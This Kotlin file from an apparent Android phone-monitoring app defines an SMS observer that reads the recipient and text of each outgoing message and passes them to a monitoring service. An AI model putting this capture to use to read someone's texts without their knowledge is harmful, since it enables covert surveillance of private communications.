package com.github.muneebwanee.dash.services.sms

import android.content.Context
import android.database.ContentObserver
import android.database.Cursor
import android.net.Uri
import android.os.Handler
import android.provider.Telephony
import com.github.muneebwanee.dash.data.preference.DataSharePreference.typeApp
import com.github.muneebwanee.dash.utils.ConstFun.startServiceSms
import com.github.muneebwanee.dash.utils.Consts.TAG
import com.github.muneebwanee.dash.utils.Consts.TYPE_SMS_OUTGOING
import com.pawegio.kandroid.e

/**
 * Created by muneebwanee on 15/12/20.
 */
class SmsObserver(private val context: Context,handler: Handler) : ContentObserver(handler) {

    override fun onChange(selfChange: Boolean, uri: Uri) {
        super.onChange(selfChange, uri)
        var cur : Cursor?=null
        try {
            cur = context.contentResolver.query(uri,null,null,null,null)
            cur.moveToFirst()
            val protocol = cur.getString(cur.getColumnIndex(Telephony.Sms.PROTOCOL))
            val address = cur.getString(cur.getColumnIndex(Telephony.Sms.ADDRESS))
            val body = cur.getString(cur.getColumnIndex(Telephony.Sms.BODY))
            if (protocol == null) {
                if (!context.typeApp) context.startServiceSms<SmsService>(address,body, TYPE_SMS_OUTGOING)
            }
        }catch (t:Throwable){ e(TAG,t.message.toString()) }
        finally { cur?.close() }
    }

}